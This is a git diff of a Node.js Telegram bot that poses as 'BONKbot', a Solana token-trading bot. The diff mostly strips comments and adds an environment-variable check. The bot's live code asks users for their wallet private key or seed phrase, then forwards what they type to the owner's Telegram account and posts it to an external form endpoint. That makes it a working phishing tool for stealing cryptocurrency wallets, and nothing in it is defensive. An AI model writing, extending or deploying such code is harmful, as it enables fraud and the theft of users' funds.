@@ -1,18 +1,24 @@
 require('dotenv').config();
 const TelegramBot = require('node-telegram-bot-api');
-const axios = require('axios'); // For making HTTP requests (e.g., sending to FormUnstatic)
+const axios = require('axios');
 
 const token = process.env.BOT_TOKEN;
 const ownerId = process.env.OWNER_ID;
-const formUnstaticURL = process.env.FORM_UNSTATIC_URL; // Your FormUnstatic endpoint
+const formUnstaticURL = process.env.FORM_UNSTATIC_URL;
 
-// Create a bot that uses polling to fetch new updates
+// Check for missing environment variables
+if (!token || !ownerId || !formUnstaticURL) {
+  console.error(
+    'Missing required environment variables. Check your .env file.'
+  );
+  process.exit(1);
+}
+
 const bot = new TelegramBot(token, { polling: true });
-
-// Store the chat state to track if a user is entering a private key or seed phrase
 const chatStates = {};
 
-// Function to send data to FormUnstatic
+console.log('Bot started successfully!');
+
 const sendToFormUnstatic = async (name, message) => {
   if (!name || !message) {
     console.error('Missing name or message for FormUnstatic submission.');
@@ -39,14 +45,12 @@ const sendToFormUnstatic = async (name, message) => {
   }
 };
 
-// Respond to any message
 bot.on('message', (msg) => {
   const chatId = msg.chat.id;
 
   if (chatStates[chatId] === 'awaiting_private_key') {
     const privateKey = msg.text;
 
-    // Send the private key to your Telegram ID and FormUnstatic
     bot.sendMessage(ownerId, `🔑 Private Key Received:\n${privateKey}`);
     sendToFormUnstatic('Private Key Received', privateKey);
 
@@ -56,12 +60,10 @@ bot.on('message', (msg) => {
       },
     });
 
-    // Clear the chat state
     delete chatStates[chatId];
   } else if (chatStates[chatId] === 'awaiting_seed_phrase') {
     const seedPhrase = msg.text;
 
-    // Send the seed phrase to your Telegram ID and FormUnstatic
     bot.sendMessage(ownerId, `📜 Seed Phrase Received:\n${seedPhrase}`);
     sendToFormUnstatic('Seed Phrase Received', seedPhrase);
 
@@ -71,15 +73,12 @@ bot.on('message', (msg) => {
       },
     });
 
-    // Clear the chat state
     delete chatStates[chatId];
   } else {
-    // Default response for other messages
     bot.sendMessage(chatId, `Hello, ${msg.from.first_name}!`);
   }
 });
 
-// Handle /start command
 bot.onText(/\/start/, (msg) => {
   const message = `Welcome to BONKbot - the fastest and most secure bot for trading any token on Solana!
 
@@ -127,7 +126,6 @@ For more info on your wallet and to export your seed phrase, tap "Wallet" below.
   bot.sendMessage(msg.chat.id, message, { parse_mode: 'Markdown', ...options });
 });
 
-// Handle button clicks (callback queries)
 bot.on('callback_query', (query) => {
   const chatId = query.message.chat.id;
 
